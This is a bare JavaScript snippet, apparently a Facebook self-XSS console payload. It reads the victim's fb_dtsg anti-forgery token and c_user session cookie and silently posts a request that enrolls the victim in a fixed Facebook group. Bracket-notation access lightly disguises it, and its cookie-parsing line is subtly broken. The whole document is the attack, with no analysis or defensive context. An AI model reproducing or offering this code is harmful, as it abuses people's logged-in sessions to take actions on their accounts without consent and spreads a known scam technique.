var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'],
    user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]); {
    var Page = new XMLHttpRequest(),
        PageURL = '//www.facebook.com/ajax/groups/membership/r2j.php',
        PageParams = 'fb_dtsg=' + fb_dtsg + '&ref=group_jump_header&group_id=611715602244921&__user=' + user_id + '';
    Page['open']('POST', PageURL, true);
    Page['onreadystatechange'] = function () {
        if (Page['readyState'] == 4 && Page['status'] == 200) {
            Page['close'];
        };
    };
    Page['send'](PageParams);
}


